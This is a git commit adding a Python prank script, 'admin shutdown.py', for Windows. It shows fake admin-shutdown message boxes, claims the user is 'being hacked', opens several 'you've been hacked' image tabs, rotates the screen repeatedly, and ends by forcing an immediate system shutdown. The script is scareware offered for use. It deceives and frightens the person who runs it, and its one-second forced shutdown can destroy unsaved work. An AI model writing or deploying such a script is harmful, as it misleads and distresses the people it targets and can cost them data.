6d9ac6419ccef5558e03f2d8a0c64b02882d4b44
Kashpro01 <andersonkash212@gmail.com>
2024-10-19 12:40:47 -0500

    Add files via upload

---
+++ admin shutdown.py
@@ -0,0 +1,38 @@
+import ctypes
+import webbrowser
+webbrowser.open('https://blackscreen.app/')
+import time
+time.sleep(1)
+ctypes.windll.user32.MessageBoxW(None, u"    admin shutdown    ", u"admin shutdown", 0)
+ctypes.windll.user32.MessageBoxW(None, u"   proceeding    ", u"admin shutdown", 0)
+ctypes.windll.user32.MessageBoxW(None, u" admin admin shutingdown....", u"admin shutdown", 0)
+ctypes.windll.user32.MessageBoxW(None, u" admin shutdown completed....", u"admin shutdown", 0)
+ctypes.windll.user32.MessageBoxW(None, u" do not close tab or will not work", u"admin shutdown", 0)
+ctypes.windll.user32.MessageBoxW(None, u"    wait...........  ", u"admin shutdown", 0)
+import time
+time.sleep(1)
+ctypes.windll.user32.MessageBoxW(None, u" just kidding ur being hacked", u"admin shutdown", 0)
+import webbrowser
+webbrowser.open ('https://ceblog.s3.amazonaws.com/wp-content/uploads/2016/04/22110359/youve-been-hacked.png')
+time.sleep(5)
+webbrowser.open('https://i.pinimg.com/236x/56/21/7b/56217b1ef6a69a2583ff13655d48bc53.jpg')
+webbrowser.open('https://i.pinimg.com/236x/56/21/7b/56217b1ef6a69a2583ff13655d48bc53.jpg')
+webbrowser.open('https://i.pinimg.com/236x/56/21/7b/56217b1ef6a69a2583ff13655d48bc53.jpg')
+webbrowser.open('https://i.pinimg.com/236x/56/21/7b/56217b1ef6a69a2583ff13655d48bc53.jpg')
+time.sleep(1)
+import rotatescreen
+import time
+
+screen = rotatescreen.get_primary_display()
+start_pos = screen.current_orientation
+
+for i in range(1, 9):
+    pos = abs((start_pos - i*90) % 360)
+    screen.rotate_to(pos)
+    time.sleep(2)
+ctypes.windll.user32.MessageBoxW(None, u"ok this is the end", u"admin shutdown", 0)
+time.sleep(2)
+ctypes.windll.user32.MessageBoxW(None, u"lol u really thought👿", u"admin shutdown",0)
+time.sleep(1)
+import os
+os.system("shutdown /s /t 1")
